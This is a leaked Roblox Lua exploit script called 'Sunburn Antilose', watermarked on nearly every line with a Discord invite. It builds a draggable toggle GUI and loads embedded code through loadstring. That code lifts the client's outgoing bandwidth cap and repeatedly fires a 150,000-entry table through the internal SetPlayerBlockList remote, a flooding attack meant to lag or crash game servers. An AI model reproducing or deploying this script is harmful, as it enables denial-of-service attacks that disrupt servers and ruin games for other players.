-- leaked by discord.gg/printed for skidding
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
-- leaked by discord.gg/printed for skidding

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
-- leaked by discord.gg/printed for skidding

local COLORS = {
    bg = Color3.fromRGB(14, 14, 16),
    surface = Color3.fromRGB(22, 22, 26),
    disabled = Color3.fromRGB(38, 38, 44),
    border = Color3.fromRGB(60, 60, 68),
    accent = Color3.fromRGB(255, 200, 40), -- leaked by discord.gg/printed for skidding
    accentDark = Color3.fromRGB(200, 140, 20),
    accentBright = Color3.fromRGB(255, 230, 80),
    sun = Color3.fromRGB(180, 120, 20),
    text = Color3.fromRGB(238, 238, 242),
    white = Color3.fromRGB(255, 255, 255),
    black = Color3.fromRGB(0, 0, 0),
}
-- leaked by discord.gg/printed for skidding

local FONT = Enum.Font.GothamBlack
-- leaked by discord.gg/printed for skidding

local SRC = [==[
-- leaked by discord.gg/printed for skidding
local RunService = game:GetService("RunService")
-- leaked by discord.gg/printed for skidding

local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false
-- leaked by discord.gg/printed for skidding

local state = {
    running = false,
    thread  = nil,
    remote  = nil,
    cache   = nil,
    pad     = "",
}
-- leaked by discord.gg/printed for skidding

local function resolve()
    -- leaked by discord.gg/printed for skidding
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end
-- leaked by discord.gg/printed for skidding

state.remote = resolve()
-- leaked by discord.gg/printed for skidding

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)
-- leaked by discord.gg/printed for skidding

state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""
-- leaked by discord.gg/printed for skidding

local function build()
    -- leaked by discord.gg/printed for skidding
    local root = table.create(Children)
    for i = 1, Children do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end
-- leaked by discord.gg/printed for skidding

local function fire()
    -- leaked by discord.gg/printed for skidding
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if RebuildEach or not state.cache then
        payload = build()
        if not RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
end
-- leaked by discord.gg/printed for skidding

local function start()
    -- leaked by discord.gg/printed for skidding
    if state.running then return end
    state.running = true
    state.cache = nil
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            if FrameDelay > 0 then
                task.wait(FrameDelay)
            else
                RunService.Heartbeat:Wait()
            end
        end
    end)
end
-- leaked by discord.gg/printed for skidding

local function stop()
    -- leaked by discord.gg/printed for skidding
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end
-- leaked by discord.gg/printed for skidding

return {
    start  = start,
    stop   = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
}
-- leaked by discord.gg/printed for skidding
]==]
-- leaked by discord.gg/printed for skidding

local loader = coroutine.create(function()
    -- leaked by discord.gg/printed for skidding
    local chunk = loadstring(SRC)
    if not chunk then return end
    local ok, api = pcall(chunk)
    if ok and type(api) == "table" then
        _G.__ALT = api
    end
end)
-- leaked by discord.gg/printed for skidding

coroutine.resume(loader)
loader = nil
-- leaked by discord.gg/printed for skidding

local api = _G.__ALT
_G.__ALT = nil
-- leaked by discord.gg/printed for skidding

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SunburnAntiloseUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui
-- leaked by discord.gg/printed for skidding

local main = Instance.new("Frame")
main.Name = "MainFrame"
main.Size = UDim2.new(0, 210, 0, 92)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = COLORS.bg
main.BorderSizePixel = 0
main.ClipsDescendants = false
main.Parent = screenGui
-- leaked by discord.gg/printed for skidding

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = main
-- leaked by discord.gg/printed for skidding

local mainGrad = Instance.new("UIGradient")
mainGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 18, 10))
mainGrad.Rotation = 135
mainGrad.Parent = main
-- leaked by discord.gg/printed for skidding

local borderFrame = Instance.new("Frame")
borderFrame.Name = "BorderFrame"
borderFrame.Size = UDim2.new(1, 2, 1, 2)
borderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
borderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
borderFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
borderFrame.BorderSizePixel = 0
borderFrame.ZIndex = 0
borderFrame.Parent = main
-- leaked by discord.gg/printed for skidding

local borderCorner = Instance.new("UICorner")
borderCorner.CornerRadius = UDim.new(0, 11)
borderCorner.Parent = borderFrame
-- leaked by discord.gg/printed for skidding

local borderGrad = Instance.new("UIGradient")
borderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(40, 30, 5)),
    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(220, 160, 20)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 230, 80)), -- leaked by discord.gg/printed for skidding
    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(220, 160, 20)),
    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(40, 30, 5)),
})
borderGrad.Rotation = 0
borderGrad.Parent = borderFrame
-- leaked by discord.gg/printed for skidding

local innerMask = Instance.new("Frame")
innerMask.Name = "InnerMask"
innerMask.Size = UDim2.new(1, -2, 1, -2)
innerMask.Position = UDim2.new(0.5, 0, 0.5, 0)
innerMask.AnchorPoint = Vector2.new(0.5, 0.5)
innerMask.BackgroundColor3 = COLORS.bg
innerMask.BorderSizePixel = 0
innerMask.ZIndex = 1
innerMask.Parent = main
-- leaked by discord.gg/printed for skidding

local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0, 9)
innerCorner.Parent = innerMask
-- leaked by discord.gg/printed for skidding

local innerGrad = Instance.new("UIGradient")
innerGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 18, 10))
innerGrad.Rotation = 135
innerGrad.Parent = innerMask
-- leaked by discord.gg/printed for skidding

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 34)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Font = FONT
title.Text = "Sunburn Antilose"
title.TextColor3 = COLORS.text
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 3
title.Parent = main
-- leaked by discord.gg/printed for skidding

local toggle = Instance.new("TextButton")
toggle.Name = "Toggle"
toggle.Size = UDim2.new(1, -20, 0, 38)
toggle.Position = UDim2.new(0, 10, 0, 44)
toggle.BackgroundColor3 = COLORS.disabled
toggle.BorderSizePixel = 0
toggle.Font = FONT
toggle.Text = ""
toggle.TextTransparency = 1
toggle.AutoButtonColor = false
toggle.ZIndex = 3
toggle.Parent = main
-- leaked by discord.gg/printed for skidding

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 8)
toggleCorner.Parent = toggle
-- leaked by discord.gg/printed for skidding

local toggleGrad = Instance.new("UIGradient")
toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
toggleGrad.Rotation = 135
toggleGrad.Parent = toggle
-- leaked by discord.gg/printed for skidding

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = COLORS.sun
toggleStroke.Thickness = 1.66
toggleStroke.Transparency = 0
toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
toggleStroke.Parent = toggle
-- leaked by discord.gg/printed for skidding

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Name = "Label"
toggleLabel.Size = UDim2.new(1, 0, 1, 0)
toggleLabel.Position = UDim2.new(0, 0, 0, 0)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Font = FONT
toggleLabel.Text = "DISABLED"
toggleLabel.TextColor3 = COLORS.white
toggleLabel.TextTransparency = 0
toggleLabel.TextSize = 14
toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
toggleLabel.TextYAlignment = Enum.TextYAlignment.Center
toggleLabel.ZIndex = 5
toggleLabel.Active = false
toggleLabel.Parent = toggle
-- leaked by discord.gg/printed for skidding

local active = false
-- leaked by discord.gg/printed for skidding

RunService.RenderStepped:Connect(function(dt)
    -- leaked by discord.gg/printed for skidding
    local speed = active and 160 or 60
    borderGrad.Rotation = (borderGrad.Rotation + speed * dt) % 360
end)
-- leaked by discord.gg/printed for skidding

local function setActive(state)
    -- leaked by discord.gg/printed for skidding
    active = state

    if state then
        toggle.BackgroundColor3 = COLORS.accentBright
        toggleGrad.Color = ColorSequence.new(COLORS.accent, COLORS.accentBright)
        toggleGrad.Rotation = 0
        toggleStroke.Color = COLORS.accentBright
        toggleLabel.Text = "ENABLED"
        toggleLabel.TextColor3 = COLORS.black
        if api and api.start then
            pcall(api.start)
        end
    else
        toggle.BackgroundColor3 = COLORS.disabled
        toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
        toggleGrad.Rotation = 135
        toggleStroke.Color = COLORS.sun
        toggleLabel.Text = "DISABLED"
        toggleLabel.TextColor3 = COLORS.white
        if api and api.stop then
            pcall(api.stop)
        end
    end
end
-- leaked by discord.gg/printed for skidding

toggle.MouseButton1Click:Connect(function()
    -- leaked by discord.gg/printed for skidding
    setActive(not active)
end)
-- leaked by discord.gg/printed for skidding

local dragging = false
local dragStart, startPos
-- leaked by discord.gg/printed for skidding

main.InputBegan:Connect(function(input)
    -- leaked by discord.gg/printed for skidding
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)
-- leaked by discord.gg/printed for skidding

UserInputService.InputChanged:Connect(function(input)
    -- leaked by discord.gg/printed for skidding
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)
-- leaked by discord.gg/printed for skidding

UserInputService.InputEnded:Connect(function(input)
    -- leaked by discord.gg/printed for skidding
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
-- leaked by discord.gg/printed for skidding